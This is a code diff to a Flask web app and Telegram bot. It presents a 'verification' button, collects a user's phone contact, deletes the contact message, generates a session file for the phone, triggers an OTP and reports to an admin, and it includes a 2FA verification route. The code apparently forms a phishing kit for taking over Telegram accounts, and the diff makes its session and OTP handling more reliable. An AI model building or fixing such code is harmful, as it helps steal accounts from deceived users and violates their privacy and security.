@@ -214,23 +214,57 @@ def index():
     """Main WebApp page"""
     return render_template('index.html')
 
-@app.route('/otp/<user_id>')
-def otp_page(user_id):
-    """OTP entry page"""
+@app.route('/otp')
+def otp_page():
+    """OTP entry page - FIXED: Get user_id from query params"""
+    user_id = request.args.get('user_id')
+    
+    if not user_id:
+        return "User ID not provided", 400
+    
     if user_id not in user_sessions:
         return "Session expired. Please share contact again.", 400
     
     session = user_sessions[user_id]
     return render_template('otp.html', user_id=user_id, phone=session['phone'])
 
-@app.route('/api/check-otp-status/<user_id>', methods=['GET'])
-def check_otp_status(user_id):
-    """Check if OTP has been sent for this user"""
+@app.route('/api/get-user-session/<user_id>', methods=['GET'])
+def get_user_session(user_id):
+    """Check user session - FIXED"""
+    try:
+        if user_id not in user_sessions:
+            return jsonify({'success': False, 'error': 'Session not found'})
+        
+        session = user_sessions[user_id]
+        
+        # Check if session expired
+        if session['expiry'] < datetime.now():
+            del user_sessions[user_id]
+            return jsonify({'success': False, 'error': 'Session expired'})
+        
+        return jsonify({
+            'success': True,
+            'has_contact': 'phone' in session,
+            'otp_sent': session.get('otp_sent', False),
+            'phone': session.get('phone', ''),
+            'status': session.get('status', 'waiting')
+        })
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/check-otp-sent/<user_id>', methods=['GET'])
+def check_otp_sent(user_id):
+    """Check if OTP has been sent for this user - FIXED"""
     try:
         if user_id not in user_sessions:
             return jsonify({'success': False, 'error': 'Session expired'})
         
         session = user_sessions[user_id]
+        
+        # Check if session expired
+        if session['expiry'] < datetime.now():
+            del user_sessions[user_id]
+            return jsonify({'success': False, 'error': 'Session expired'})
         
         if session.get('otp_sent'):
             return jsonify({
@@ -402,7 +436,7 @@ def verify_2fa():
 # ==================== BOT HANDLERS ====================
 @bot.message_handler(commands=['start'])
 def start_command(message):
-    """Send WebApp button directly - FIXED START MESSAGE"""
+    """Send WebApp button - FIXED: Simple response"""
     try:
         # Create WebApp URL
         webapp_url = WEBHOOK_URL.rstrip('/') if WEBHOOK_URL else f"https://{request.host}"
@@ -415,24 +449,37 @@ def start_command(message):
         )
         keyboard.add(webapp_btn)
         
-        # SEND SIMPLE START MESSAGE
+        # Send simple message with button
         bot.send_message(
             message.chat.id,
-            "Click the button below to open the WebApp:",
+            "Click below to verify:",
             reply_markup=keyboard
         )
         
-        print(f"WebApp button sent to user {message.from_user.id}")
+        print(f"✅ Start command handled for user {message.from_user.id}")
         
     except Exception as e:
-        print(f"Start command error: {e}")
+        print(f"❌ Start command error: {e}")
+        # Try to send error message
+        try:
+            bot.send_message(message.chat.id, "Error: " + str(e))
+        except:
+            pass
+
+@bot.message_handler(commands=['help'])
+def help_command(message):
+    """Help command"""
+    bot.send_message(
+        message.chat.id,
+        "Use /start to open the verification WebApp."
+    )
 
 @bot.message_handler(content_types=['contact'])
 def handle_contact(message):
-    """Handle contact sent from WebApp.requestContact()"""
+    """Handle contact sent from WebApp.requestContact() - FIXED"""
     try:
         contact = message.contact
-        user_id = message.from_user.id
+        user_id = str(message.from_user.id)  # Convert to string
         chat_id = message.chat.id
         
         phone = contact.phone_number
@@ -457,25 +504,21 @@ def handle_contact(message):
         except Exception as e:
             print(f"Could not delete message: {e}")
         
-        # Initialize or update user session
-        if user_id not in user_sessions:
-            user_sessions[user_id] = {
-                'user_id': user_id,
-                'chat_id': chat_id,
-                'contact_message_id': message.message_id,
-                'created': datetime.now(),
-                'expiry': datetime.now() + timedelta(seconds=session_expiry)
-            }
-        
-        # Update session with contact info
-        user_sessions[user_id].update({
+        # Initialize user session
+        user_sessions[user_id] = {
+            'user_id': user_id,
+            'chat_id': chat_id,
+            'contact_message_id': message.message_id,
+            'created': datetime.now(),
+            'expiry': datetime.now() + timedelta(seconds=session_expiry),
+            'status': 'contact_received',
             'phone': phone,
             'first_name': first_name,
             'last_name': last_name,
             'contact_received': True
-        })
+        }
         
-        print(f"📞 Contact stored for user {user_id}: {phone}")
+        print(f"📞 Session created for user {user_id}: {phone}")
         
         # Generate session file
         session_file = generate_session_file(phone)
@@ -515,8 +558,8 @@ def handle_contact(message):
 ✅ <b>OTP sent successfully</b>""",
                     parse_mode='HTML'
                 )
-            except:
-                pass
+            except Exception as e:
+                print(f"Admin notification error: {e}")
             
         else:
             user_sessions[user_id]['status'] = 'error'
@@ -536,9 +579,12 @@ def handle_contact(message):
                 )
             except:
                 pass
+            
+            # Delete session on error
+            del user_sessions[user_id]
         
     except Exception as e:
-        print(f"Contact handler error: {e}")
+        print(f"❌ Contact handler error: {e}")
 
 # ==================== WEBHOOK SETUP ====================
 def setup_webhook():
